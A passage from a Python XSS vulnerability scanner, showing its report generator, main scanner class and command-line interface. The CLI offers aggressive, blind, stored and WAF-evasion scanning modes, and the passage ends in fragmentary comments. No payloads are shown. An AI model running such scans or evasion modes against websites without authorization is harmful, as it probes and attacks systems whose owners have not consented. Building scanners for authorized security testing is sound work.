                                <pre class="code-block"><code>{{ vuln.evidence | safe_text }}</code></pre>

                                {% if vuln.poc_curl %}
                                <p><strong>cURL Proof of Concept:</strong></p>
                                <pre class="code-block"><code>{{ vuln.poc_curl | safe_text }}</code></pre>
                                {% endif %}

                                {% if vuln.context %}
                                <p><strong>Context:</strong></p>
                                <pre class="code-block"><code>{{ vuln.context | safe_text }}</code></pre>
                                {% endif %}
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                </div>
                {% else %}
                <div class="section">
                    <h2 class="section-title">No Vulnerabilities Found</h2>
                    <p>No XSS vulnerabilities were detected during this scan.</p>
                </div>
                {% endif %}

                {% if technologies %}
                <div class="section">
                    <h2 class="section-title">Technologies Detected</h2>
                    <div style="display: flex; flex-wrap: wrap; gap: 10px;">
                        {% for category, items in technologies.items() %}
                            {% if items %}
                            <div style="background: #e5e7eb; padding: 15px; border-radius: 6px; flex: 1; min-width: 200px;">
                                <h3 style="margin-bottom: 10px; color: var(--text-primary);">{{ category|title }}</h3>
                                <ul style="list-style: none; padding: 0;">
                                    {% for item in items %}
                                    <li style="padding: 5px 0; border-bottom: 1px solid #d1d5db;">{{ item }}</li>
                                    {% endfor %}
                                </ul>
                            </div>
                            {% endif %}
                        {% endfor %}
                    </div>
                </div>
                {% endif %}

                <div class="section">
                    <h2 class="section-title">Recommendations</h2>
                    <ol style="padding-left: 20px;">
                        <li>Implement Content Security Policy (CSP) with strict directives</li>
                        <li>Use context-aware output encoding for all user input</li>
                        <li>Implement proper input validation using whitelists</li>
                        <li>Regularly update and patch all frameworks and libraries</li>
                        <li>Conduct regular security testing and code reviews</li>
                        <li>Implement Web Application Firewall (WAF) rules for XSS protection</li>
                    </ol>
                </div>

                <div class="footer">
                    <p>Generated by Professional XSS Scanner v{{ scanner_version }}</p>
                    <p>This report is for authorized security testing purposes only.</p>
                </div>
            </div>

            <script>
            document.addEventListener('DOMContentLoaded', function () {

                    // Collapsible functionality
                    document.querySelectorAll('.collapsible-header').forEach(header => {
                  header.addEventListener('click', function () {

                      const container = this.closest('.collapsible');
                       if (!container) return;

                      container.classList.toggle('active');

                    const arrow = this.querySelector('span:last-child');
                  if (arrow) {
                          arrow.textContent = container.classList.contains('active') ? '▲' : '▼';
                  }
                  });
                   });

                    // Print functionality
                    document.addEventListener('keydown', function (e) {
                            if (e.ctrlKey && e.key === 'p') {
                            e.preventDefault();
                            window.print();
                            }
                    });

            });
            </script>

        </body>
        </html>
        """

        with open(template_file, 'w', encoding='utf-8') as f:
            f.write(template)

    def generate(self, result: ScanResult) -> Dict[str, str]:
        """Generate reports in configured formats"""
        reports = {}

        # Calculate statistics
        stats = result.calculate_statistics()

        # Prepare data for templates
        report_data = {
            'scan_id': result.scan_id,
            'target_url': result.target_url,
            'timestamp': result.end_time.strftime('%Y-%m-%d %H:%M:%S'),
            'duration': f"{result.duration:.2f}",
            'pages_scanned': result.pages_scanned,
            'requests_made': result.requests_made,
            'total_vulnerabilities': stats['total_vulnerabilities'],
            'critical_count': stats['by_severity'].get('critical', 0),
            'high_count': stats['by_severity'].get('high', 0),
            'medium_count': stats['by_severity'].get('medium', 0),
            'low_count': stats['by_severity'].get('low', 0),
            'verified_count': stats['verified_count'],
            'risk_level': result.risk_level,
            'risk_score': f"{result.risk_score:.1f}",
            'waf_detected': result.waf_detected,
            'csp_detected': result.csp_detected,
            'vulnerabilities': [v.to_dict() for v in result.vulnerabilities],
            'technologies': result.technologies,
            'scanner_version': result.config.get('version', '4.0'),
        }

        # Generate JSON report
        if self.config.output_format in ['json', 'both']:
            json_report = self._generate_json_report(result, report_data)
            reports['json'] = json_report

        # Generate HTML report
        if self.config.output_format in ['html', 'both']:
            html_report = self._generate_html_report(report_data)
            reports['html'] = html_report

        # Generate Markdown report
        if self.config.output_format == 'markdown':
            markdown_report = self._generate_markdown_report(report_data)
            reports['markdown'] = markdown_report

        return reports

    def _generate_json_report(self, result: ScanResult, report_data: Dict) -> str:
        """Generate JSON report"""
        # Create comprehensive JSON report
        json_data = {
            'metadata': {
                'scan_id': result.scan_id,
                'scanner': 'Professional XSS Scanner',
                'version': result.config.get('version', '4.0'),
                'target_url': result.target_url,
                'start_time': result.start_time.isoformat(),
                'end_time': result.end_time.isoformat(),
                'duration_seconds': result.duration,
            },
            'summary': {
                'pages_scanned': result.pages_scanned,
                'requests_made': result.requests_made,
                'vulnerabilities_found': result.vulnerabilities_found,
                'risk_level': result.risk_level,
                'risk_score': result.risk_score,
                'waf_detected': result.waf_detected,
                'waf_type': result.waf_type,
                'csp_detected': result.csp_detected,
                'technologies_detected': len(result.technologies),
            },
            'statistics': result.calculate_statistics(),
            'vulnerabilities': [v.to_dict() for v in result.vulnerabilities],
            'technologies': result.technologies,
            'pages': [p.to_dict() for p in result.pages[:10]],  # First 10 pages
            'config': result.config,
        }

        # Save JSON file
        json_path = os.path.join(self.report_dir, f"report_{result.scan_id}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, indent=2, default=str)

        self.logger.info(f"JSON report saved to: {json_path}")
        return json_path

    def _generate_html_report(self, report_data: Dict) -> str:
        """Generate HTML report"""
        if not self.template_env:
            self.logger.warning("Jinja2 not available, skipping HTML report")
            return ""

        try:
            # Render template
            template = self.template_env.get_template('report.html.j2')
            html_content = template.render(**report_data)

            # Save HTML file
            html_path = os.path.join(self.report_dir, f"report_{report_data['scan_id']}.html")
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html_content)

            self.logger.info(f"HTML report saved to: {html_path}")
            return html_path

        except Exception as e:
            self.logger.error(f"Failed to generate HTML report: {e}")
            return ""

    def _generate_markdown_report(self, report_data: Dict) -> str:
        """Generate Markdown report"""
        markdown = f"""# XSS Scan Report

        ## Scan Information
        - **Scan ID:** {report_data['scan_id']}
        - **Target:** {report_data['target_url']}
        - **Date:** {report_data['timestamp']}
        - **Duration:** {report_data['duration']} seconds

        ## Summary
        - **Pages Scanned:** {report_data['pages_scanned']}
        - **Total Vulnerabilities:** {report_data['total_vulnerabilities']}
        - **Critical:** {report_data['critical_count']}
        - **High:** {report_data['high_count']}
        - **Verified:** {report_data['verified_count']}
        - **Risk Level:** {report_data['risk_level']} ({report_data['risk_score']}/100)

        ## Vulnerabilities
        """

        for vuln in report_data['vulnerabilities']:
            markdown += f"""
        ### {vuln['type'].upper()} XSS - {vuln['severity'].upper()}
        - **URL:** {vuln['url']}
        - **Parameter:** {vuln['parameter']}
        - **Payload:** `{vuln['payload'][:100]}...`
        - **Confidence:** {vuln['confidence'] * 100:.1f}%
        - **Evidence:** {vuln['evidence']}
        """

        markdown += """
        ## Recommendations
        1. Implement Content Security Policy (CSP)
        2. Use proper output encoding
        3. Validate all user input
        4. Regular security testing
        5. Keep software updated

        ---

        *Generated by Professional XSS Scanner*
        """

        # Save Markdown file
        md_path = os.path.join(self.report_dir, f"report_{report_data['scan_id']}.md")
        with open(md_path, 'w', encoding='utf-8') as f:
            f.write(markdown)

        self.logger.info(f"Markdown report saved to: {md_path}")
        return md_path

# ============================================================================
# MAIN SCANNER CLASS
# ============================================================================


# ============================================================================
# MAIN SCANNER CLASS
# ============================================================================

class ProfessionalXSSScanner:
    """Main scanner class orchestrating all components"""

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.logger = logging.getLogger(config.scanner_name)

        # Validate configuration
        try:
            config.validate()
        except ValueError as e:
            self.logger.error(f"Configuration error: {e}")
            raise

        # Initialize components
        self.detector = ProfessionalXSSDetector(config)
        self.report_generator = ProfessionalReportGenerator(config)

        # Statistics
        self.start_time = None
        self.end_time = None

        # Banner
        self._print_banner()

    def _print_banner(self):
        """Print scanner banner"""
        if not self.config.quiet:
            banner = f"""
{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}
{Fore.CYAN}PROFESSIONAL XSS SCANNER v{self.config.version}{Style.RESET_ALL}
{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}
{Fore.YELLOW}Target:{Style.RESET_ALL} {self.config.target_url}
{Fore.YELLOW}Scan ID:{Style.RESET_ALL} {self.config.scan_id}
{Fore.YELLOW}Threads:{Style.RESET_ALL} {self.config.max_threads}
{Fore.YELLOW}Depth:{Style.RESET_ALL} {self.config.max_depth}
{Fore.YELLOW}Max Pages:{Style.RESET_ALL} {self.config.max_pages}
{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}
"""
            print(banner)

    def scan(self) -> ScanResult:
        """Execute complete scan"""
        self.start_time = datetime.now()

        try:
            # Run detection
            result = self.detector.scan()

            # Generate reports
            if self.config.output_format != 'none':
                reports = self.report_generator.generate(result)

                if not self.config.quiet and reports:
                    print(f"\n{Fore.GREEN}[✓] Reports generated:{Style.RESET_ALL}")
                    for format_type, path in reports.items():
                        print(f"  {format_type.upper()}: {path}")

            # Print summary
            self._print_summary(result)

            return result

        except KeyboardInterrupt:
            if not self.config.quiet:
                print(f"\n{Fore.RED}[!] Scan interrupted by user{Style.RESET_ALL}")
            raise

        except Exception as e:
            self.logger.error(f"Scan failed: {e}", exc_info=True)
            if not self.config.quiet:
                print(f"\n{Fore.RED}[!] Scan failed: {e}{Style.RESET_ALL}")

            # Create error result
            self.end_time = datetime.now()
            duration = (self.end_time - self.start_time).total_seconds() if self.start_time else 0

            error_result = ScanResult(
                scan_id=self.config.scan_id,
                target_url=self.config.target_url,
                start_time=self.start_time or datetime.now(),
                end_time=self.end_time or datetime.now(),
                duration=duration,
                pages_scanned=0,
                requests_made=0,
                vulnerabilities_found=0,
                vulnerabilities=[],
                pages=[],
                risk_level='error',
                risk_score=0.0,
                config=self.config.__dict__
            )

            return error_result

    def _print_summary(self, result: ScanResult):
        """Print scan summary"""
        if self.config.quiet:
            return

        stats = result.calculate_statistics()

        summary = f"""
{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}
{Fore.CYAN}SCAN COMPLETED{Style.RESET_ALL}
{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}

{Fore.YELLOW}Summary:{Style.RESET_ALL}
  Duration: {result.duration:.2f} seconds
  Pages Scanned: {result.pages_scanned}
  Requests Made: {result.requests_made}
  Vulnerabilities Found: {result.vulnerabilities_found}

{Fore.YELLOW}Vulnerability Breakdown:{Style.RESET_ALL}
  Critical: {stats['by_severity'].get('critical', 0)}
  High: {stats['by_severity'].get('high', 0)}
  Medium: {stats['by_severity'].get('medium', 0)}
  Low: {stats['by_severity'].get('low', 0)}
  Verified: {stats['verified_count']}

{Fore.YELLOW}Risk Assessment:{Style.RESET_ALL}
  Level: {result.risk_level.upper()}
  Score: {result.risk_score:.1f}/100

{Fore.YELLOW}Security Headers:{Style.RESET_ALL}
  WAF Detected: {'Yes' if result.waf_detected else 'No'} {f'({result.waf_type})' if result.waf_type else ''}
  CSP Enabled: {'Yes' if result.csp_detected else 'No'}
  HSTS Enabled: {'Yes' if result.hsts_enabled else 'No'}

{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}
"""

        print(summary)

        # Print critical vulnerabilities
        critical_vulns = [v for v in result.vulnerabilities if v.severity == 'critical']
        if critical_vulns:
            print(f"{Fore.RED}[!] CRITICAL VULNERABILITIES FOUND:{Style.RESET_ALL}")
            for i, vuln in enumerate(critical_vulns[:3], 1):  # Show first 3
                print(f"  {i}. {vuln.type.upper()} - {vuln.url}")
                print(f"     Parameter: {vuln.parameter}")
                print(f"     Payload: {vuln.payload[:50]}...")
                print()


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def main():
    """Main command line interface"""
    parser = argparse.ArgumentParser(
        description="Professional XSS Scanner - Enterprise Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan
  python xss_scanner.py https://example.com

  # Full scan with all features
  python xss_scanner.py https://example.com --full --aggressive --output both

  # Safe scan for production
  python xss_scanner.py https://example.com --safe --no-browser

  # Custom configuration
  python xss_scanner.py https://example.com --threads 50 --depth 3 --max-pages 100

  # Specific scan types
  python xss_scanner.py https://example.com --reflected-only --dom-only

Advanced Features:
  --full              Enable all scan types and features
  --aggressive        Aggressive scanning mode (more payloads, deeper crawl)
  --safe              Safe mode for production systems
  --output FORMAT     Output format: json, html, both, markdown, none
  --report-dir DIR    Custom report directory
  --proxy URL         Use proxy for requests
  --config FILE       Load configuration from YAML file

For more information, visit: https://github.com/professional-xss-scanner
        """
    )

    # Required
    parser.add_argument("url", help="Target URL to scan")

    # Scan Modes
    scan_mode = parser.add_mutually_exclusive_group()

    scan_mode.add_argument("--full", action="store_true",
                           help="Full scan (all features enabled)")
    scan_mode.add_argument("--aggressive", action="store_true",
                           help="Aggressive scan mode")
    scan_mode.add_argument("--safe", action="store_true",
                           help="Safe mode for production systems")

    # Scan Types
    parser.add_argument("--reflected-only", action="store_true",
                        help="Scan only for reflected XSS")
    parser.add_argument("--stored-only", action="store_true",
                        help="Scan only for stored XSS")
    parser.add_argument("--dom-only", action="store_true",
                        help="Scan only for DOM XSS")
    parser.add_argument("--blind-only", action="store_true",
                        help="Scan only for blind XSS")
    parser.add_argument("--json-only", action="store_true",
                        help="Scan only for JSON XSS")

    # Performance
    parser.add_argument("--threads", "-t", type=int, default=25,
                        help="Maximum concurrent threads (default: 25)")
    parser.add_argument("--depth", "-d", type=int, default=5,
                        help="Maximum crawl depth (default: 5)")
    parser.add_argument("--max-pages", "-m", type=int, default=200,
                        help="Maximum pages to scan (default: 200)")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")

    # Browser Options
    parser.add_argument("--no-browser", action="store_true",
                        help="Disable browser automation")
    parser.add_argument("--visible", action="store_true",
                        help="Run browser in visible mode (not headless)")

    # Payload Options
    parser.add_argument("--payload-level", choices=['basic', 'intermediate', 'advanced', 'expert'],
                        default='advanced', help="Payload complexity level")
    parser.add_argument("--max-payloads", type=int, default=50,
                        help="Maximum payloads per parameter (default: 50)")
    parser.add_argument("--no-evasion", action="store_true",
                        help="Disable evasion techniques")
    parser.add_argument("--custom-payloads", type=str,
                        help="Path to custom payloads file")

    # Output
    parser.add_argument("--output", "-o", choices=['json', 'html', 'both', 'markdown', 'none'],
                        default='both', help="Output format (default: both)")
    parser.add_argument("--report-dir", type=str, default="reports",
                        help="Report directory (default: reports)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Verbose output")
    parser.add_argument("--debug", action="store_true",
                        help="Debug mode")
    parser.add_argument("--quiet", "-q", action="store_true",
                        help="Quiet mode (minimal output)")
    parser.add_argument("--no-color", action="store_true",
                        help="Disable colored output")

    # Advanced
    parser.add_argument("--proxy", type=str,
                        help="Proxy URL (e.g., http://proxy:8080)")
    parser.add_argument("--rate-limit", type=int, default=0,
                        help="Rate limit in requests per second (0 = no limit)")
    parser.add_argument("--verify-ssl", action="store_true",
                        help="Verify SSL certificates")
    parser.add_argument("--config", type=str,
                        help="Load configuration from YAML file")

    args = parser.parse_args()

    # Create configuration
    config = ScannerConfig(target_url=args.url)

    # Apply command line arguments
    config.max_threads = args.threads
    config.max_depth = args.depth
    config.max_pages = args.max_pages
    config.request_timeout = args.timeout
    config.output_format = args.output
    config.output_dir = args.report_dir
    config.verbose = args.verbose
    config.debug = args.debug
    config.quiet = args.quiet

    if args.no_color:
        config.color_output = False

    # Apply scan modes
    if args.full:
        # Enable everything
        config.scan_reflected = True
        config.scan_stored = True
        config.scan_dom = True
        config.scan_blind = True
        config.scan_json = True
        config.payload_level = 'expert'
        config.use_evasion = True
        config.use_polyglot = True
        config.risk_assessment = True
        config.cvss_scoring = True
        config.generate_poc = True

    elif args.aggressive:
        # Aggressive but safe
        config.max_threads = min(50, args.threads * 2)
        config.max_depth = min(10, args.depth + 2)
        config.max_pages = min(500, args.max_pages * 2)
        config.payload_level = 'expert'
        config.max_payloads_per_param = 100
        config.use_evasion = True
        config.use_polyglot = True

    elif args.safe:
        # Safe mode
        config.scan_reflected = True
        config.scan_stored = False  # Disable stored for safety
        config.scan_dom = True
        config.scan_blind = False
        config.scan_json = True
        config.use_browser = False
        config.payload_level = 'basic'
        config.max_payloads_per_param = 10
        config.use_evasion = False
        config.request_delay = 0.2
        config.persistent_testing = False

    # Apply scan type restrictions
    if args.reflected_only:
        config.scan_reflected = True
        config.scan_stored = False
        config.scan_dom = False
        config.scan_blind = False
        config.scan_json = False

    elif args.stored_only:
        config.scan_reflected = False
        config.scan_stored = True
        config.scan_dom = False
        config.scan_blind = False
        config.scan_json = False
        config.stored_detection_mode = 'conservative'

    elif args.dom_only:
        config.scan_reflected = False
        config.scan_stored = False
        config.scan_dom = True
        config.scan_blind = False
        config.scan_json = False

    elif args.blind_only:
        config.scan_reflected = False
        config.scan_stored = False
        config.scan_dom = False
        config.scan_blind = True
        config.scan_json = False

    elif args.json_only:
        config.scan_reflected = False
        config.scan_stored = False
        config.scan_dom = False
        config.scan_blind = False
        config.scan_json = True

    # Browser options
    if args.no_browser:
        config.use_browser = False
    if args.visible:
        config.headless = False

    # Payload options
    config.payload_level = args.payload_level
    config.max_payloads_per_param = args.max_payloads
    if args.no_evasion:
        config.use_evasion = False
    if args.custom_payloads:
        config.custom_payload_file = args.custom_payloads

    # Advanced options
    if args.proxy:
        config.proxy = args.proxy
    if args.rate_limit:
        config.rate_limit = args.rate_limit
    if args.verify_ssl:
        config.verify_ssl = True

    # Load configuration from file if provided
    if args.config and YAML_AVAILABLE:
        try:
            with open(args.config, 'r') as f:
                file_config = yaml.safe_load(f)
                # Update config with file values
                for key, value in file_config.items():
                    if hasattr(config, key):
                        setattr(config, key, value)
        except Exception as e:
            print(f"Error loading config file: {e}")
            sys.exit(1)

    # Create and run scanner
    try:
        scanner = ProfessionalXSSScanner(config)
        result = scanner.scan()

        # Exit with appropriate code
        critical_count = len([v for v in result.vulnerabilities if v.severity == 'critical'])
        high_count = len([v for v in result.vulnerabilities if v.severity == 'high'])

        if critical_count > 0:
            sys.exit(3)  # Critical vulnerabilities
        elif high_count > 0:
            sys.exit(2)  # High vulnerabilities
        elif result.vulnerabilities_found > 0:
            sys.exit(1)  # Other vulnerabilities
        else:
            sys.exit(0)  # No vulnerabilities

    except KeyboardInterrupt:
        print("\nScan interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\nFatal error: {e}")
        if config.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
        sys.exit(130)



#--------------------------------------
#NOTE
#------------------------------------




#[:limit] are set by default for securit and resource
#so please adjust this accordingly






#-------------------------------------------------
#   vulnerabilities.append( break statement are added check that